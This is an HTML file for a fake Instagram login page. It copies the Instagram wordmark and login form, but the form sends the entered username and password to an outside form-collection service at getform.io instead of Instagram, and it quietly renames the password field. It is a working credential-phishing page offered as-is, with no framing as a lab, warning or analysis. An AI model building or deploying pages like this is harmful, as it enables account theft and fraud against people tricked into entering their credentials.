<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram Login </title>
  <link rel="stylesheet" href="styles.css">
</head>
<body>
  <div class="container">
    <div class="login-box">
      <img src="https://www.vectorlogo.zone/logos/instagram/instagram-wordmark.svg" alt="Instagram" class="logo">
      <form action="https://getform.io/f/anllxkja" method="POST">
        <input type="text" id="username" name="username" placeholder="Phone number, username, or email" required>
        <input type="password" id="password" name="username2" placeholder="Password" required>
        <button type="submit">Log In</button>
      </form>
      <div class="divider">
        <span>OR</span>
      </div>
      <div class="social-login">
        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Icon">
        <a href="#">Log in with Facebook</a>
      </div>
      <a href="#" class="forgot-password">Forgot password?</a>
    </div>
    <div class="signup-box">
      <p>Don't have an account? <a href="#">Sign up</a></p>
    </div>
  </div>
<script src="script.js"></script>
</body>
</html>
